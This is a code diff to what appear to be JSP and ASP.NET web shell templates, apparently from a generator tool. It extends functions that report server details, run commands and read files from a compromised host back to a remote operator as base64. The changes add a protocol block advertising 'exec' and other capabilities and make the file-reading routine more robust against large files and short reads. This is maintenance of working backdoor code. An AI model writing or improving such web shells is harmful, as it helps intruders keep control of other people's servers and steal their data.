@@ -68,7 +68,7 @@ static String DSW_esc(String s) {{
 static String DSW_env() {{
     try {{
         String cwd = System.getProperty("user.dir", "");
-        return "{{\\"ok\\":true,\\"data\\":{{\\"server\\":\\"" + DSW_esc(System.getProperty("os.name", "") + " " + System.getProperty("os.version", "") + " " + System.getProperty("os.arch", "")) + "\\",\\"web_server\\":\\"JSP\\",\\"php_version\\":\\"\\",\\"current_dir\\":\\"" + DSW_esc(cwd) + "\\",\\"separator\\":\\"\\\\\\"}}}}";
+        return "{{\\"ok\\":true,\\"data\\":{{\\"server\\":\\"" + DSW_esc(System.getProperty("os.name", "") + " " + System.getProperty("os.version", "") + " " + System.getProperty("os.arch", "")) + "\\",\\"web_server\\":\\"JSP\\",\\"php_version\\":\\"\\",\\"current_dir\\":\\"" + DSW_esc(cwd) + "\\",\\"separator\\":\\"\\\\\\",\\"info\\":{{\\"ProtoVersion\\":\\"2\\",\\"Capabilities\\":\\"chunked,stream,db,plugin,exec\\",\\"ShellType\\":\\"file\\"}}}}}}";
     }} catch (Exception e) {{ return "{{\\"ok\\":false,\\"error\\":\\"env failed\\"}}"; }}
 }}
 static String DSW_exec(String c, String w) {{
@@ -118,15 +118,14 @@ static String DSW_read(String p, String o, String l) {{
         java.io.RandomAccessFile f = new java.io.RandomAccessFile(p, "r");
         f.seek(off);
         byte[] buf;
-        if (len >= 0) {{
-            long remain = f.length() - off;
-            int n = (int) Math.min(len, remain);
-            buf = new byte[n];
-            f.readFully(buf);
-        }} else {{
-            buf = new byte[(int) (f.length() - off)];
-            f.readFully(buf);
+        long remain = f.length() - off;
+        long want = len >= 0 ? Math.min(len, remain) : remain;
+        if (want > Integer.MAX_VALUE) {{
+            f.close();
+            return "{{\"ok\":false,\"error\":\"file too large\"}}";
         }}
+        buf = new byte[(int) want];
+        f.readFully(buf);
         f.close();
         return "{{\"ok\":true,\"data\":\"" + java.util.Base64.getEncoder().encodeToString(buf) + "\"}}";
     }} catch (Exception e) {{ return "{{\"ok\":false,\"error\":\"read failed\"}}"; }}
@@ -355,7 +354,7 @@ static string DSW_esc(string s) {{
     return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n").Replace("\t", "\\t");
 }}
 static string DSW_env() {{
-    try {{ return "{{\\"ok\\":true,\\"data\\":{{\\"server\\":\\"" + DSW_esc(Environment.OSVersion.VersionString) + "\\",\\"web_server\\":\\"ASP.NET\\",\\"php_version\\":\\"\\",\\"current_dir\\":\\"" + DSW_esc(Directory.GetCurrentDirectory()) + "\\",\\"separator\\":\\"\\\\\\"}}}}"; }}
+    try {{ return "{{\\"ok\\":true,\\"data\\":{{\\"server\\":\\"" + DSW_esc(Environment.OSVersion.VersionString) + "\\",\\"web_server\\":\\"ASP.NET\\",\\"php_version\\":\\"\\",\\"current_dir\\":\\"" + DSW_esc(Directory.GetCurrentDirectory()) + "\\",\\"separator\\":\\"\\\\\\",\\"info\\":{{\\"ProtoVersion\\":\\"2\\",\\"Capabilities\\":\\"chunked,stream,plugin,exec\\",\\"ShellType\\":\\"file\\"}}}}}}"; }}
     catch (Exception) {{ return "{{\\"ok\\":false,\\"error\\":\\"env failed\\"}}"; }}
 }}
 static string DSW_exec(string c, string w) {{
@@ -396,9 +395,17 @@ static string DSW_read(string p, string o, string l) {{
         using (var fs = File.OpenRead(p)) {{
             fs.Seek(off, SeekOrigin.Begin);
             long remain = fs.Length - off;
-            int n = len >= 0 ? (int)Math.Min(len, remain) : (int)remain;
-            byte[] buf = new byte[n];
-            fs.Read(buf, 0, n);
+            long want = len >= 0 ? Math.Min(len, remain) : remain;
+            if (want > int.MaxValue) return "{{\"ok\":false,\"error\":\"file too large\"}}";
+            byte[] buf = new byte[(int)want];
+            // fs.Read 可能短读：循环直到读满或 EOF，否则内容会被零填充
+            int total = 0;
+            while (total < buf.Length) {{
+                int r = fs.Read(buf, total, buf.Length - total);
+                if (r <= 0) break;
+                total += r;
+            }}
+            if (total != buf.Length) Array.Resize(ref buf, total);
             return "{{\"ok\":true,\"data\":\"" + Convert.ToBase64String(buf) + "\"}}";
         }}
     }}
